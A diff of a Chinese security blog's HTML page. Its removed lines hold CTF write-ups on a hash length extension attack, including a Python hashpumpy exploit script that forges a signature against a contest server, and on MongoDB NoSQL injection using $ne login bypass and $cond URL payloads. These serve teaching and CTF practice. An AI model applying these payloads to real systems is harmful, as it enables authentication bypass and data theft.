This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>empty函数 非空返回false，别想多了</p>
-</blockquote>
-<p>关键在这里：
-<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p>
-<p>其中<code>$secret</code>是不知道的，<code>$username</code>和<code>password</code>是可以控制的，并且<code>$secret</code>的长度是15</p>
-<p>哈希扩展攻击的原理之后再讨论，我们先分析这题咋搞</p>
-<p>首先username必须是admin,password不能是admin那就随便输一个值比如cck</p>
-<p>我们的目标很简单，就是绕过它
-<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p>
-<p>所以目标就是让<code>$COOKIE[&quot;getmein&quot;]</code>和md5后的值相等，所以需要同时伪造两边的值天平才能平衡</p>
-<p>而hashpump工具就是来干这个的：
-<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba2.png" alt=""></p>
-<p>第一个参数是<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>的值，第二个参数是填充的数据，第三个参数是填充数据加key的长度，第四个参数是添加的数据。
-这样就能同时生成天平左边和右边的值了</p>
-<p>当然还需要URL编码一下</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba4.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba3.png" alt=""></p>
-<p>理解了这题那么这道De1ctf的题目也就好说了</p>
-<p>参考ctftime上的exp代码如下：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,hashpumpy,urllib</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Arguments:</span></span><br><span class="line"><span class="string">    hexdigest(str):      Hex-encoded result of hashing key + original_data.</span></span><br><span class="line"><span class="string">    original_data(str):  Known data used to get the hash result hexdigest.</span></span><br><span class="line"><span class="string">    data_to_add(str):    Data to append</span></span><br><span class="line"><span class="string">    key_length(int):     Length of unknown data prepended to the hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    A tuple containing the new hex digest and the new message.</span></span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload = <span class="string">'flag.txt'</span></span><br><span class="line">param = <span class="string">'param='</span> + payload</span><br><span class="line">base_url = <span class="string">'http://139.180.128.86/'</span></span><br><span class="line">signurl = base_url + <span class="string">'geneSign?'</span> + param</span><br><span class="line">r = requests.post(url=signurl,cookies=&#123;<span class="string">'action'</span>:<span class="string">'scan'</span>&#125;)</span><br><span class="line">sign = r.content</span><br><span class="line">print(sign)</span><br><span class="line">readsign,add_data = hashpumpy.hashpump(sign,payload+<span class="string">'scan'</span>,<span class="string">'read'</span>,<span class="number">16</span>)</span><br><span class="line">print(readsign)</span><br><span class="line"><span class="comment"># print add_data</span></span><br><span class="line">add_data = add_data[len(payload):]</span><br><span class="line">print(add_data)</span><br><span class="line">expurl = base_url + <span class="string">'De1ta?'</span> + param</span><br><span class="line">print(urllib.parse.quote(add_data))</span><br><span class="line">r = requests.post(url=expurl,cookies=&#123;<span class="string">'action'</span>:urllib.parse.quote(add_data),<span class="string">'sign'</span>:readsign&#125;)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure></p>
-<p>当然我用的是python3，并且注意<code>urllib.parse.quote(add_data)</code>方法</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba5.png" alt=""></p>
-<p>就成功了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/04/noSQL-Injection/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="百浪多息">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="prontosil">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/04/noSQL-Injection/" itemprop="url">noSQL Injection</a></h1>
-        
-
-		
-
-        <div class="post-meta">
-         
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-04T16:23:29+08:00">
-                2019-08-04
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified&#58;</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-14T15:46:10+08:00">
-                2019-08-14
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  818
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  3
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2>cybrics noSQL</h2>
-<p>这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下</p>
-<p>php操作mongodb的语法：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connect to mongodb</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();</span><br><span class="line"><span class="comment">// select a database</span></span><br><span class="line">$db = $m-&gt;test;</span><br><span class="line"><span class="comment">// select collection</span></span><br><span class="line">$collection = $db-&gt;users;</span><br><span class="line"></span><br><span class="line">$cursor = $collection-&gt;find($data);</span><br><span class="line">$cursor = $collection-&gt;findone($data);</span><br></pre></td></tr></table></figure></p>
-<p>基本上就是实例化对象，选择数据库，选择表，然后开始查找</p>
-<p>查询语法主要如下：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.user.find(&#123;<span class="string">'username'</span>: <span class="string">'xxxppp'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找用户名不为admin且password为123456的用户</span></span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:&#123;$ne:<span class="string">'admin'</span>&#125;, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//正则匹配：</span></span><br><span class="line"></span><br><span class="line">db.customer.find(&#123;<span class="string">'name'</span>: &#123;<span class="string">'$regex'</span>:<span class="string">'.*s.*'</span>&#125; &#125;)</span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:/jrx/i&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>这道题目首先可以用<code>dirsearch</code>发现是git源码泄露，之后用<code>GitHacker.py</code>获取到源码</p>
-<p>查看<code>index.php</code>，首先要登陆，需要绕过<code>auth</code>函数</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><code>username</code>和<code>password</code>都没有经过过滤就拼接了，但是这里有一个<code>json_decode</code>不太好过</p>
-<p>如果没有<code>json_decode</code>函数，我们可以通过<code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}</code>绕过登陆的限制</p>
-<p>于是这样做：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql0.png" alt=""></p>
-<p>这样就绕过限制登陆了</p>
-<p>来看第二个：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">    $pipeline = [</span><br><span class="line">        [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">        [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">        [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $filters = [</span><br><span class="line">        [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><code>array_merge</code>函数将<code>$pipeline</code>和<code>filters</code>进行合并</p>
-<p>查找资料得知</p>
-<blockquote>
-<p>在mongodb的aggregate中，可以使用$cond进行条件语句：</p>
-</blockquote>
-<p>并且：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/noSql1.png" alt=""></p>
-<p>我们可以构造如下链接，匹配到<code>flag</code>时将其移除</p>
-<p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</code></p>
-<blockquote>
-<p>利用条件语句，发现flags时，就输出其title：</p>
-</blockquote>
-<p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category</code></p>
-<p>从title中我们得知有text，那么读取：</p>
-<p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category</code></p>
-<p>就可以获得flag了</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql2.png" alt=""></p>
-<h2>NoSQL注入实践</h2>
-<p>MongoDb作为一个NoSQL的数据库，操作其实还是很SQL很相似的</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql3.png" alt=""></p>
-<p>都有数据库，不同的是集合对应于表，文档对应于行，字段对应于列</p>
-<p>这张图显示了映射关系：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql4.png" alt=""></p>
-<p>于是操作MongoDb时可以理解为选择数据库，然后选择collection，然后构造查询语句进行查询</p>
-<p>比如demo.html</p>
-<p><code>$m = new MongoClient()</code>连接数据库，<code>$db=$m-&gt;test</code>选择test数据库，然后选择collection : <code>$collection=$db-&gt;uses</code></p>
-<p>构造的查询语句为：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data = array(</span><br><span class="line">		&apos;username&apos; =&gt;  $_REQUEST[&apos;username&apos;],</span><br><span class="line">		&apos;password&apos; =&gt;  $_REQUEST[&apos;password&apos;]</span><br><span class="line">		</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
-<p>之后进行查询： <code>$cursor = $collection-&gt;find($data)</code></p>
-<p>这里没有字符串的拼接，似乎无法注入，但是如果我们传入的username和password都是数组的话，那么查询的语句就会成为这样：</p>
-<p>构造的URL：<code>http://localhost/NoSQLI/login/login.php?username[$ne]=1&amp;password[$ne]=1&amp;login-submit=login</code></p>
-<p>此时拼接的<code>$data</code></p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql5.png" alt=""></p>
-<p>json_encode后得到：
-<code>&quot;{&quot;username&quot;:{&quot;$ne&quot;:&quot;1&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}&quot;</code></p>
-<h2>参考</h2>
-<p><a href="https://blog.szfszf.top/tech/nosql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93mongodb/#MongoDB" target="_blank" rel="noopener">NoSQL注入总结(MongoDB)</a></p>
-<p><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/" target="_blank" rel="noopener">019 CyBRICS CTF Quals wp</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2794,7 +2723,7 @@ md5后，276f722736c95d99e921722cf9ed621c再转成字符串:' ' 'or' 6&lt;trach&
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-count">51</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2816,7 +2745,7 @@ md5后，276f722736c95d99e921722cf9ed621c再转成字符串:' ' 'or' 6&lt;trach&
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-count">51</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
